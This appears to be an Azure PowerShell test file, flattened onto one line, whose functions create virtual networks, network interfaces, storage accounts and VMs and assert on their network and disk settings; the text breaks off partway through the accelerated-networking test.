function Test-SingleNetworkInterface{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.Primary true;Assert-NotNull $getnic.MacAddress;Remove-AzureRmVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-SingleNetworkInterfaceDnsSettings{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id -DnsServer "8.8.8.8";$nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3';$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.Primary true;Assert-NotNull $getnic.MacAddress;Assert-NotNull $getnic.DnsSettings.AppliedDnsServers;Remove-AzureRmVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-MultipleNetworkInterface{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A4';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$nic1 = New-AzureRmNetworkInterface -Force -Name ('nic1' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId;$nic2 = New-AzureRmNetworkInterface -Force -Name ('nic2' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nic1.Id;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nic1.Id;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nic2.Id -Primary;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 2;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[1].Id $nic2.Id;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[1].Primary true;Assert-AreNotEqual $p.NetworkProfile.NetworkInterfaces[0].Primary true;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3';$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 2;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nic1.Id;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[1].Id $nic2.Id;$getnic1 = Get-AzureRmNetworkInterface -Name ('nic1' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic1.Id;Assert-AreNotEqual  $getnic1.Primary true;Assert-NotNull $getnic1.MacAddress;$getnic2 = Get-AzureRmNetworkInterface -Name ('nic2' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[1].Id $getnic2.Id;Assert-AreEqual $getnic2.Primary true;Assert-NotNull $getnic2.MacAddress;Remove-AzureRmVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-AddNetworkInterface{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nicId = $nic.Id;$nicList = Get-AzureRmNetworkInterface -ResourceGroupName $rgname;$nicList[0].Primary = $true;$p = Add-AzureRmVMNetworkInterface -VM $p -NetworkInterface $nicList;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicList[0].Id;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Primary $true;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;}finally{Clean-ResourceGroup $rgname}}function Test-EffectiveRoutesAndNsg{$rgname = Get-ComputeTestResourceNametry{$loc = Get-ComputeVMLocation;New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_A2';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nsg = New-AzureRmNetworkSecurityGroup -Force -Name ('nsg' + $rgname) -ResourceGroupName $rgname -Location $loc$nsgId = $nsg.Id$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id -NetworkSecurityGroupId $nsgId;$nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage;$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.Primary true;Assert-NotNull $getnic.MacAddress;$effectiveRoute = Get-AzureRmEffectiveRouteTable -ResourceGroupName $rgname -NetworkInterfaceName $getnic.NameAssert-NotNull $effectiveRoute[0].Source$effectiveNsgs = Get-AzureRmEffectiveNetworkSecurityGroup -ResourceGroupName $rgname -NetworkInterfaceName $getnic.Name       }finally{Clean-ResourceGroup $rgname}}function Test-SingleNetworkInterfaceWithAcceleratedNetworking{$rgname = Get-ComputeTestResourceNametry{$loc = "WestCentralUS";New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_DS15_v2';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -EnableAcceleratedNetworking -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;Assert-AreEqual $nic.EnableAcceleratedNetworking $true$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 